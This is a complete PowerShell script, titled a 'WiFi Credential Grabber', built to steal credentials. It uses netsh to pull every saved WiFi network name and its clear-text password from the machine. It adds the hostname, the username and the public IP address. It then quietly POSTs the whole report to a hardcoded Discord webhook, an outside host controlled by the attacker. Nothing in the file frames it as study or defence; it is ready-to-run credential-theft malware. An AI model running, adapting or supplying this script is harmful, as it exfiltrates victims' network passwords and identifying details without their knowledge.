# WiFi Credential Grabber - sends all saved WiFi creds to Discord
$webhook = "https://discord.com/api/webhooks/1526566178690961480/P2AGaxV10TiiooKfrfD6-7POJFOb5utzqodFz6tFBWjSL8eFwixnP0K35_mozCzeKkwn"
$botName = "wefibot"

# Extract all saved profile names
$profiles = (netsh wlan show profiles) |
    Select-String "All User Profile" |
    ForEach-Object { $_ -split ":\s+" | Select-Object -Index 1 }

# Get credentials for each profile
$results = foreach ($p in $profiles) {
    $info = netsh wlan show profile name="$p" key=clear
    $pw = ($info | Select-String "Key content" | ForEach-Object { $_ -split ":\s+" | Select-Object -Index 1 })
    [PSCustomObject]@{
        SSID     = $p
        Password = if ($pw) { $pw } else { "<open / no key stored>" }
    }
}

# Machine context
$hostname = $env:COMPUTERNAME
$user     = $env:USERNAME
$ip       = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -ErrorAction SilentlyContinue).ip
$date     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Build the message
$table = ($results | Format-Table -AutoSize | Out-String).Trim()
$msg = @"
**WiFi Credentials Report**
Hostname: $hostname
Username: $user
IP Address: $ip
Date: $date

SSID      Password
------      --------
$table
"@

# Send to Discord
$payload = @{
    username     = $botName
    content      = $msg
    embeds       = @()
    allowed_mentions = @{
        parse = @()
    }
} | ConvertTo-Json -Compress

Invoke-RestMethod -Method "POST" -Uri "$webhook" -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
